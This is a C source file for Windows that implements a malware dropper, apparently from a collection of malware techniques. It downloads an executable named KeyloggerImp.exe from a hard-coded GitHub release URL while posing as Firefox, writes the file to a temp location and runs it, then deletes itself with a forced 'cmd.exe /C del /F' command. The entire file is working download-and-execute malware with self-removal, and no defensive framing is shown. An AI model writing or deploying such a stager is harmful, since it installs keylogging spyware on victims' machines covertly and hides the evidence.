#include <Windows.h>
#include <WinInet.h>
#include <Strsafe.h>

#pragma comment(lib, "Wininet.lib")

#define BUFSIZE 1024
#define CLEAN_RESOURCE	InternetCloseHandle(hrFile);\
						InternetCloseHandle(hClient);

wchar_t const* remoteFileAt = L"https://github.com/tiencong283/ways-to-malware/releases/download/1.0/KeyloggerImp.exe";
wchar_t const* userAgent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0";

void printError(wchar_t const* msg) {
	MessageBox(NULL, msg, L"ERROR", MB_OK | MB_ICONERROR);
}

// dump some memory into a file and return its path
wchar_t* writeToFile(PVOID mem, DWORD size) {
	HANDLE hFile = NULL;
	wchar_t tmpDirAt[MAX_PATH + 1];
	wchar_t tmpFileAt[MAX_PATH + 1];
	DWORD ret = 0;
	DWORD nwrite = 0;

	// generate unique file
	if (!(ret=GetTempPath(MAX_PATH, tmpDirAt)) || (ret > MAX_PATH)) {
		return NULL;
	}
	if (!GetTempFileName(tmpDirAt, L"BIN", 0, tmpFileAt)) {
		return NULL;
	}
	// write to file
	if ((hFile = CreateFile(tmpFileAt, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
		wchar_t buffer[BUFSIZE];
		MessageBox(NULL, buffer, buffer, MB_OK);
		return NULL;
	}
	if (!WriteFile(hFile, mem, size, &nwrite, NULL) || (nwrite!=size)) {
		CloseHandle(hFile);
		return NULL;
	}

	FlushFileBuffers(hFile);
	CloseHandle(hFile);
	return _wcsdup(tmpFileAt);
}

// download remote file into memory
BOOL downloadFile(HINTERNET hrFile, LPVOID* buffer, PDWORD size) {
	LPBYTE pMem;
	DWORD memSize = BUFSIZE;
	DWORD pos = 0;
	DWORD chunkSize = 0;
	DWORD nread = 0;

	pMem = (LPBYTE)malloc(BUFSIZE);
	do {	// receive all chunks
		// get file size
		if (!InternetQueryDataAvailable(hrFile, &chunkSize, 0, 0)) {
			printError(L"In InternetQueryDataAvailable");
			return 1;
		}
		if (chunkSize + pos > memSize) {
			memSize = (memSize + chunkSize) << 1;
			if ((pMem = (LPBYTE)realloc(pMem, memSize)) == NULL) {
				return FALSE;
			}
		}

		// download file into memory
		if (!InternetReadFile(hrFile, &pMem[pos], chunkSize, &nread) || nread != chunkSize) {
			return FALSE;
		}
		pos += chunkSize;
	} while (nread != 0);

	*buffer = pMem;
	*size = pos;
	return TRUE;
}

wchar_t delCmdFormat[BUFSIZE] = L"cmd.exe /C del /F \"%s\"";
BOOL startProcess(wchar_t* executableAt) {
	wchar_t buffer[BUFSIZE];
	wchar_t delCmd[BUFSIZE];

	STARTUPINFO sInfo;
	PROCESS_INFORMATION pInfo;

	ZeroMemory(&sInfo, sizeof(STARTUPINFO));
	ZeroMemory(&pInfo, sizeof(PROCESS_INFORMATION));

	if (!CreateProcess(executableAt, NULL,
		NULL, NULL, FALSE, 0, NULL, NULL, &sInfo, &pInfo)) {
		return FALSE;
	}

	// delete by API 
	GetModuleFileName(NULL, buffer, BUFSIZE);
	if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {	// prevent truncating
		return FALSE;
	}
	DeleteFile(buffer);

	if (StringCchPrintf(delCmd, BUFSIZE, delCmdFormat, buffer) != S_OK) {
		wchar_t buf[BUFSIZE];
		wsprintf(buf, L"%d", GetLastError());
		MessageBox(NULL, buf, buf, MB_OK);
		return FALSE;
	}
	// force delete by cmd
	CreateProcess(NULL, delCmd,
		NULL, NULL, FALSE, 0, NULL, NULL, &sInfo, &pInfo);

	CloseHandle(pInfo.hThread);
	CloseHandle(pInfo.hProcess);
	return TRUE;
}

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	HINTERNET hClient = NULL;
	DWORD_PTR context = 0;
	HINTERNET hrFile = NULL;
	DWORD binSize = 0;
	LPVOID pBin = NULL;
	DWORD nread = 0;
	wchar_t* downloadedAt = NULL;

	// attempt to make a connection before issuing any requests
	if (InternetAttemptConnect(0) != ERROR_SUCCESS) {
		printError(L"No internet connection");
		return 1;
	}
	// is the host reachable
	if (!InternetCheckConnection(remoteFileAt, FLAG_ICC_FORCE_CONNECTION, 0)) {
		printError(L"Host unreachable");
		return 1;
	}
	// setup client browser
	if ((hClient = InternetOpen(userAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0)) == NULL) {
		printError(L"In InternetOpen");
		return 1;
	}
	// connect to URL
	if ((hrFile = InternetOpenUrl(
		hClient, remoteFileAt,  // client vs url
		NULL, 0,	// headers
		0, context	// flag and context
		)) == NULL) {
		InternetCloseHandle(hClient);
		printError(L"In InternetOpenUrl");
		return 1;
	}

	if (!downloadFile(hrFile, &pBin, &binSize)) {
		printError(L"Cannot download remote executable");
		CLEAN_RESOURCE
		return 1;
	}

	if (*(PWORD)pBin != 0x5A4D) {
		printError(L"Corrupted executable");
		CLEAN_RESOURCE
		return 1;
	}

	if (!(downloadedAt=writeToFile(pBin, binSize))) {
		printError(L"Cannot dump downloaded file to filesystem");
		CLEAN_RESOURCE
		return 1;
	}
	if (!startProcess(downloadedAt)) {
		printError(L"Cannot start the downloaded binary");
		CLEAN_RESOURCE
		return 1;
	}

	free(downloadedAt);
	free(pBin);
	CLEAN_RESOURCE
	return 0;
}